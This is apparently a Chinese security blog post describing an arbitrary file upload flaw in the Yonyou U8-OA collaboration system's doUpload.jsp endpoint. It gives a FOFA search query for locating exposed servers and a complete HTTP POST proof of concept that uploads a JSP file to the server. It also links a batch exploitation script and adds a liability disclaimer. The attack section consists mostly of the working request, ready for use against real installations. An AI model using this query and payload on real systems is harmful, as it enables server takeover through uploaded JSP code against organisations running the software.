#  漏洞复现-用友U8-OA协同工作系统doUpload.jsp任意文件上传（附poc   
Y1_K1NG  Yi安全   2024-02-24 14:49  
  
**由于微信公众号推送机制改变了，快来星标不再迷路，谢谢大家！**  
  
****  
免责声明  
  
本文章仅用于信息安全防御技术分享，因用于其他用途而产生不良后果,作者不承担任何法律责任，请严格遵循中华人民共和国相关法律法规，禁止做一切违法犯罪行为。  
文  
章中敏感信息均  
已做多层打马处理。  
传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行  
负责。  
  
  
  
  
  
 用友U8   
  
## 一：漏洞描述  
  
         
用友U8-OA协同工作系统doUpload.jsp接口  
## 二：网络空间测绘查询  
  
fofa  
```
title="用友U8-OA"
```  
  
‍## 三：漏洞复现  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SiciaJiayvKbnEeJicYfmTjuibX7a0HNhNaA7FYsw07TUiaIt0IwrsTzVt4OVoSmfYgAMSyJW3l16Zxct8rMqHneSU8Q/640?wx_fmt=png&from=appmsg "")  
  
****  
poc****  
```
POST /yyoa/portal/tools/doUpload.jsp HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 219
Content-Type: multipart/form-data; boundary=7b1db34fff56ef636e9a5cebcd6c9a75

--7b1db34fff56ef636e9a5cebcd6c9a75
Content-Disposition: form-data; name="iconFile"; filename="info.jsp"
Content-Type: application/octet-stream

<% out.println("tteesstt1"); %>
--7b1db34fff56ef636e9a5cebcd6c9a75--
```  
  
****## 四：批量脚本获取  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SiciaJiayvKbnEeJicYfmTjuibX7a0HNhNaA7oHCT2Fn0keNEaqyU4fDBk7HgPicUH7ADiasSSCWR2LguyNZothR0PLAg/640?wx_fmt=png&from=appmsg "")  
```
https://github.com/Y1-K1NG/poc_exp/tree/main/20240224%E7%94%A8%E5%8F%8BU8-OA%E5%8D%8F%E5%90%8C%E5%B7%A5%E4%BD%9C%E7%B3%BB%E7%BB%9FdoUpload.jsp%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0
```  
  
  
‍  
  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
  
由于传播、利用本公众号Yi安全所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号Yi安全及作者不为**此**  
承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢！  
  
好文分享收藏赞一下最美点在看哦  
  
  
  
